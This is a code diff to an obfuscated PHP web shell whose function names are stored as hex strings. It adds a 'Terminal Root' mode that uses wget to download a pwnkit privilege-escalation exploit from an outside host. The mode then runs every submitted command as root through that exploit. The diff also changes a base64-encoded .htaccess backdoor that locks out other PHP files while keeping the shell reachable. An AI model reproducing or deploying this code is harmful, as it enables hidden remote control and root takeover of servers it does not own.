@@ -35,7 +35,8 @@ $Array = [
     '756e6c696e6b', // u n l i n k => 30
     '66696c65', // f i l e => 31
     '6d756c7469706172742f666f726d2d64617461', // m u l t i p a r t / f o r m d a t a => 32
-    '444f43554d454e545f524f4f54' // r o o t d o c => 33 
+    '444f43554d454e545f524f4f54', // r o o t d o c => 33 
+    '68747470733a2f2f7777772e6861786f726469736c616e642e746563682f6c6f63616c726f6f742f70776e6b6974' // Source maybe? => 34
 ];
 $hitung_array = count($Array);
 for ($i = 0; $i < $hitung_array; $i++) {
@@ -528,6 +529,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
             <div class="list-tool">
                 <ul class="tool-menu">
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal Root</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
                     <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
@@ -685,6 +687,42 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
             </div>
         </div>
     <?php endif; ?>
+    <?php if ($_GET['action'] == "root-terminal") : ?>
+        <div class="terminal-content">
+            <div class="terminal">
+                <div class="terminal-body">
+                    <header>
+                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
+                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
+                    </header>
+                    <form action="" method="post">
+                        <input type="text" placeholder="root@terminal~#" name="terminal-root" class="terminal-input" autofocus>
+                        <input type="submit" value=">" name="submit-root" class="terminal-submit">
+                    </form>
+                    <?php if (isset($_POST['submit-root'])) :  ?>
+                        <textarea class="output-terminal" disabled>
+<?php
+                        $terminal = $_POST['terminal-root'];
+                        echo "[!] Type install for running autoroot\n";
+                        if ($terminal == "install") {
+                            echo "[+] Downloading The source \n";
+                            echo _mad_cmd("wget " . $fungsi[34] . " --no-check-certificate");
+                            echo "[!] Chmod file pwnkit....\n";
+                            echo _mad_cmd("chmod +x pwnkit");
+                            echo "[+] Compiling File pwnkit...\n";
+                            echo _mad_cmd('./pwnkit "id" >> mad-pwnkit');
+                            echo "[+] Giving Permission on mad-pwnkit\n";
+                            echo _mad_cmd("chmod +x mad-pwnkit");
+                            echo "[!] Done Sir. now u can running on root user";
+                        }
+                        echo htmlspecialchars(_mad_cmd('./pwnkit "' . $terminal . '"'));
+?>
+                        </textarea>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
     <?php
     if (isset($_POST['submit-modal'])) {
         if ($_POST['create_file']) {
@@ -762,7 +800,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 <?php
 
 if ($_GET['backdoor'] == True) {
-    $base64_text = "PEZpbGVzTWF0Y2ggIi5waCp8UGgqfHBIKnxQSCoiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJnZWNrby5waHB8aW5kZXgucGhwfGluZGV4Lmh0bWx8d3AtY29uZmlnLnBocHxhZG1pbi5waHB8d3AtaW5jbHVkZXMucGhwIj4KICAgIE9yZGVyIERlbnksIEFsbG93CiAgICBBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJcLihqcGU/Z3xibXB8cG5nKSQiPgogICAgQWxsb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPg==";
+    $base64_text = "PEZpbGVzTWF0Y2ggIi5waCp8UGgqfHBIKnxQSCoiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJnZWNrby5waHB8aW5kZXgucGhwfGluZGV4Lmh0bWwiPgogICAgT3JkZXIgRGVueSwgQWxsb3cKICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4=";
     $document_root = $_SERVER[$fungsi[33]];
     $cmd = _mad_cmd("echo '" . base64_decode($base64_text) . "' >> " . $document_root . "/.htaccess");
     if ($cmd) {
